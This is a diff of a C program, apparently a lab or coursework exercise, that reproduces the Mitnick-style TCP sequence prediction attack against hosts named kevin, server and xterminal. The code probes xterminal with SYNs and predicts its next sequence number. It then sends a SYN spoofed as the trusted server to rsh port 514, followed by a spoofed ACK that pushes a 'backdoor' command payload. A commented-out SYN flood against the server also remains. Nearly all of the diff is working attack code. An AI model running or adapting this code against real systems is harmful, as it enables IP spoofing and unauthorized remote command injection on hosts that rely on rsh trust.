@@ -5,12 +5,6 @@
 #include <unistd.h>
 #include <pcap.h>
 
-
-//eth level data -> do I need this??
-#define KEVIN_MAC "02:00:ac:10:10:02"
-#define SERVER_MAC "02:00:ac:10:10:03"
-#define XTERMINAL_MAC "02:00:ac:10:10:04"
-
 //ip level data
 char * KEVIN_IP = "172.16.16.2";
 char * SERVER_IP = "172.16.16.3";
@@ -22,7 +16,6 @@ char * XTERMINAL_IP = "172.16.16.4";
 #define PAYLOAD_RST "enable"
 
 //initializations as per tcpdump online documentation
-#include <inttypes.h>
 
 #define SIZE_ETH 14
 
@@ -75,7 +68,7 @@ struct tcp_hdr {
 
 
 //function definitions
-uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
+uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip, uint32_t seq);
 int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint32_t my_seq, uint32_t ack);
 uint32_t compute_next_seq(uint32_t n1, uint32_t n2);
 
@@ -117,16 +110,12 @@ int main (void)
 		exit(EXIT_FAILURE);
 	}
 
-	//dos the server
-	char disable[] = "disable";
-	int i;
-	printf("Starting the DOS attack\n");
-	for (i = 0; i < 15; i++)
-	{
+
+
 		//craft and send 10 packets with "disable" payload
-		printf("dos\n");
+		//printf("dos\n");
 		//send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, kevin_ip);
-	}
+
 	//now the server will ignore syn acks, that's exactly what I need because my plan is:
 		//send spoofed syn, the xterminal will send real synack to the server
 		//I will respond with spoofed ack cause I know the server seq num (probing)
@@ -139,14 +128,15 @@ int main (void)
 	char *dev;																		// The device to sniff, eth0?
 	char errbuf[PCAP_ERRBUF_SIZE];								// Error string
 	struct bpf_program fp;												// The compiled filter
-	char filter_exp[] = "src host xterminal";			// The filter expression, only packets that I receive from xterminal
+	char filter_exp[] = "src host xterminal and (tcp[tcpflags] & (tcp-syn | tcp-ack) != 0)";		 //only get syn ack from xterminal
 	bpf_u_int32 mask;															// Netmask
 	bpf_u_int32 net;															// kevin IP
 	struct pcap_pkthdr header;										// pcap header
 	const u_char *packet;													// sniffed packet
-	const struct ip_hdr *ip_hdr;
+	//const struct ip_hdr *ip_hdr;
 	const struct tcp_hdr *tcp_hdr;
 
+	//from libpcap documentation
 	/* Define the device */
 	dev = pcap_lookupdev(errbuf);
 	if (dev == NULL)
@@ -182,23 +172,26 @@ int main (void)
 
 	//probe xterminal
 	uint32_t seq_array[3]; //actually I onlly need 2
+	uint32_t seqn = 100000;
 
-	printf("Starting probing\n");
+	//PROBE:
+	printf("Starting probing to compute next sequence number\n");
+	int i;
 	for (i = 0; i < 3; i++)
 	{
 		//printf("probe\n");
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
-		send_syn(514, 514 + (uint16_t )i + 1, NULL, 0, l, xterm_ip, kevin_ip);
+		send_syn(514, 514 + (uint16_t )i + 1, NULL, 0, l, xterm_ip, kevin_ip, seqn + 3000*i);
 		usleep(1000);
 		packet = pcap_next(handle, &header);
 
-		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
+		//ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
 		tcp_hdr = (const struct tcp_hdr *) (packet + SIZE_ETH + sizeof(struct ip_hdr));
 
-		tcp_seq seq = htonl(tcp_hdr->th_seq);
-		tcp_seq ack = htonl(tcp_hdr->th_ack);
+		uint32_t seq = ntohl(tcp_hdr->th_seq);
+		uint32_t ack = ntohl(tcp_hdr->th_ack);
 		//usleep(1000);
-		printf("seq %u, ack %u\n", seq, ack);
+		printf("received seq %u, ack %u\n", seq, ack);
 		seq_array[i] = (uint32_t) seq;
 
 	}
@@ -207,17 +200,29 @@ int main (void)
 	sleep(1);
 
 	//compute nextseq
-	printf("predictions\n");
-	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]) -1);
+	printf("prediction check\n");
+	uint32_t check = compute_next_seq(seq_array[1], seq_array[0]) -1;
+	printf("%u\n", check);
+
+	if (check == seq_array[2])
+	{
+		printf("prediction was successful\n\n");
+	}
+	else
+	{
+		printf("prediction unsuccesful, should restart \n");
+		exit(EXIT_FAILURE);
+	}
 
 	uint32_t predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
-	printf("predicted next seq %lu\n", predicted_seq);
+	printf("\nnext sequence number %u\n", predicted_seq);
 	//exploit trust relation
 
 	//send syn impersonating the server
 	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
-	uint32_t my_seq = send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip);
-	printf("sent spoofed syn with seq %u, waiting a second\n", my_seq);
+	uint32_t my_seq = 42424242;
+	send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip, my_seq);
+	printf("sent spoofed syn with seq %u\n\n", my_seq);
 	sleep(1);
 	//send ack with predicted seq and inject backdoor
 	//the command interpretation of the payload is specified in the manpage rshd. Need null-terminated: stderr\0user\0user\0command\0
@@ -225,27 +230,25 @@ int main (void)
 	uint32_t b_len = 38;
 	//int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack)
 	send_ack(514, 514, (uint8_t *) backdoor, b_len, l, server_ip, xterm_ip, my_seq + 1,  predicted_seq);
-	printf("sent ack and pushed backdoor\n");
+	printf("sent ack and pushed backdoor\n\n");
 
-	//connect from my own ip
 
-	//enable the server back
 
 	exit(EXIT_SUCCESS);
 }
 
 
-uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
+uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip, uint32_t seq)
 {
 
 	libnet_ptag_t t;
 	//build syn
-	uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);
+	//uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);
 
 	t = libnet_build_tcp(
 		src_port, //sp source port
 		dest_port,											//dp destinatin port
-		my_seq, //sequence number
+		seq, //sequence number
     0, 															//ack number, can I send whatever?
     TH_SYN,													//control bit SYN
 		2048, 													//window size, random is ok?
@@ -294,13 +297,9 @@ uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32
 		printf("error while sending packet\n");
 		exit(EXIT_FAILURE);
 	}
-	else
-	{
-		printf("sent %d\n", success);
-	}
 
 	libnet_clear_packet(l);
-	return my_seq;
+	return seq;
 }
 
 
@@ -360,10 +359,6 @@ int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t p
 	{
 		printf("error while sending packet\n");
 		exit(EXIT_FAILURE);
-	}
-	else
-	{
-		printf("sent %d\n", success);
 	}
 
 	libnet_clear_packet(l);
